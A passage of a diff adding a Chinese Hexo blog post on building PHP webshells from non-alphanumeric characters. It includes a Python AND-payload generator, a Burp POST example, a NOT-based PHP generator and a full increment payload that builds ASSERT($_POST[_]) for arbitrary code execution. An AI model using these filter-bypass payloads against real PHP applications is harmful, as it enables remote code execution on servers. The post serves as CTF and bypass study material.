class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></figure>
+
+<p>但是<code>且</code>拼接需要对于<code>&amp;</code>字符urlencode一下，因为我们这里题目是get传参</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   <span class="keyword">if</span>(arg==<span class="string">&quot;&quot;</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;()&quot;</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=open(<span class="string">&quot;and.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;&quot;</span>+urllib.parse.quote(<span class="string">&quot;&amp;&quot;</span>)+<span class="string">&quot;\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(input(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(input(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   print(param)</span><br></pre></td></tr></table></figure>
+
+<h4 id="post的小问题"><a href="#post的小问题" class="headerlink" title="post的小问题"></a>post的小问题</h4><p>这里突然想到试试post传参的方式试试，然后就出现了点问题，首先先解决一下传参的几种编码方式</p>
+<blockquote>
+<p>1：application/x-www-form-urlencoded   –&gt;  默认模式，在发送到服务器之前，所有字符都会进行编码</p>
+<p>就是会对你post的数据再进行一次url编码</p>
+<p>2：multipart/form-data   –&gt; 不对字符编码，在使用包含文件上传控件的表单时，必须使用该值。</p>
+<p>直接传</p>
+<p>3：text/plain  –&gt;  空格转换为 “+” 加号，但不对特殊字符编码。</p>
+</blockquote>
+<p>这里遇到点问题</p>
+<p>我直接使用postman的<code>application/x-www-form-urlencoded</code>方式传过去发现报<code>hacked</code>因为postman使用<code>application/x-www-form-urlencoded</code>会自动再次编码一遍，然后到php<code>$code=$_POST[&#39;code&#39;];</code>会解码一遍这里会得到<code>(&quot;%7b%7b%7b%7b%7e%7e%7f&quot;%26&quot;%f0%e8%f0%e9%ee%e6%ef&quot;)();</code>就会有可见字符，这里一个方法就是先postman解码一下，有点类似我们写反序列化时遇到private类因为有\00会选择先urlencode然后到postman再解码</p>
+<p>这里还有一个办法就是通过burpsuite来发包</p>
+<blockquote>
+<p>POST / HTTP/1.1<br>Host: xxxxx<br>Content-Length: 61<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close</p>
+<p>code=(“%7b%7b%7b%7b%7e%7e%7f”%26”%f0%e8%f0%e9%ee%e6%ef”)();</p>
+</blockquote>
+<p>注意<code>Content-Type</code>的类型</p>
+<p>还有我发现google浏览器的hackbar提供了</p>
+<p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202104/14/204027-570612.png" alt="image-20210414204027786"></p>
+<p>这种<code>application/x-www-form-urlencoded(raw)</code>方式就是数据以text/plain传但是<code>Content-Type</code>类型写的是<code>application/x-www-form-urlencoded</code>很方便</p>
+<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">$system=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">$command=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~$system).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~$command).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>首先可以看一下<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4">p牛这篇这部分</a></p>
+<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a></p>
+<blockquote>
+<p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>，而在 C 中，<code>a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。</p>
+</blockquote>
+<p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202104/16/112103-412265.png" alt="image-20210416112103069"></p>
+<p>虽然php沿袭perl习惯但是支持c风格</p>
+<p>所以我们可以通过<code>&#39;a&#39;++=&gt;&#39;b&#39;</code>，根据p牛的说法我们可以通过<code>[]</code>数组(Array)获取首字母<code>A</code>这样再<code>++</code>就可以获得其他的字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_=[];<span class="comment">//Array</span></span><br><span class="line">$_=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;</span><br><span class="line">$_=$_[<span class="string">&#x27;#&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="comment">//A</span></span><br><span class="line">$___=$_;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">var_dump($__);</span><br><span class="line"><span class="comment">//S</span></span><br></pre></td></tr></table></figure>
+
+<p>但是这个方法好像只能<code>php7.0.12</code>以下的版本才可以</p>
+<p>完整的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;使用时需要url编码下</span><br><span class="line">$_&#x3D;[];$_&#x3D;@&quot;$_&quot;;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;];$___&#x3D;$_;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$____&#x3D;&#39;_&#39;;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$_&#x3D;$$____;$___($_[_]);</span><br><span class="line">固定格式 构造出来的 ASSERT($_POST[_]);</span><br><span class="line">然后post传入   _&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+
+<h3 id="php5上传临时文件"><a href="#php5上传临时文件" class="headerlink" title="php5上传临时文件"></a>php5上传临时文件</h3><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell">PHP5+shell打破禁锢</a></p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2099/10/20/%E8%AE%B0%E5%BD%95/" title= "记录">
+                    <div class="nextTitle">记录</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2021/01/25/ctfshow-djb/" title= "ctfshow-djb">
+                    <div class="prevTitle">ctfshow-djb</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:dsil3nce@foxmail.com.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/intro/qq.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-number">1.</span> <span class="toc-text">异或</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%96"><span class="toc-number">2.</span> <span class="toc-text">或</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%94"><span class="toc-number">3.</span> <span class="toc-text">且</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#post%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98"><span class="toc-number">3.1.</span> <span class="toc-text">post的小问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-number">4.</span> <span class="toc-text">取反</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-number">5.</span> <span class="toc-text">自增</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php5%E4%B8%8A%E4%BC%A0%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">php5上传临时文件</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 10
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2099/10/20/%E8%AE%B0%E5%BD%95/" >记录</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2021/04/16/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell/" >无字母数字webshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2021/01/25/ctfshow-djb/" >ctfshow-djb</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2020/12/26/%E7%BA%B5%E6%A8%AA%E6%9D%AF/" >纵横杯</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2020/12/26/dasctf-bjd/" >dasctf&bjd</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/2020/12/13/postgresql%E5%88%9D%E6%8E%A2/" >postgresql初探</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/2020/12/01/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98/" >ctfshow红包题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2020/11/17/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb%E4%B8%A4%E9%A2%98-%E5%A4%8D%E7%8E%B0/" >第六届上海市大学生网络安全大赛web两题(复现)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2020/09/05/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" >frp内网穿透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/03</span><a class="archive-post-title" href= "/2020/03/03/phpstorm-xdebug/" >phpstorm+xdebug断点调试环境(转载)</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="wp"><span class="iconfont-archer">&#xe606;</span>wp</span>
+    
+        <span class="sidebar-tag-name" data-tags="others"><span class="iconfont-archer">&#xe606;</span>others</span>
+    
+        <span class="sidebar-tag-name" data-tags="network"><span class="iconfont-archer">&#xe606;</span>network</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
+    
+        <span class="sidebar-category-name" data-categories="others"><span class="iconfont-archer">&#xe60a;</span>others</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Dsil3nc3"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
